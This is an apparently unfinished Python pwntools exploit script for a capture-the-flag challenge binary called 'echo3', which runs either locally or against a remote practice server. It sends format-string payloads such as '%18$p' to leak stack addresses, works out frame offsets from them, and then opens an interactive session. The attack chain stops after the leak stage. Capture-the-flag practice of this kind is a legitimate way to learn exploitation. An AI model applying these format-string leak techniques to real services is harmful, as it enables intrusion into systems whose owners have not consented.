#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo3")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo3")
    libc = elf.libc


else:
    io = remote("hackme.inndy.tw", 7720)
    libc = ELF("./libc-2.23.so.i386")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendline("%18$p")
    mainEbp = int(io.recvuntil("\n", drop = True), 16)
    success("mainEbp -> {:#x}".format(mainEbp))
    hardfmtEbp = mainEbp - 0x50
    success("hardfmtEbp -> {:#x}".format(hardfmtEbp))

    offset = (mainEbp - hardfmtEbp) / 4
    io.sendline("%{}$p.%{}$p.%{}$p".format(offset - 1, offset, offset))
    
    

     
    io.interactive()
    io.close()



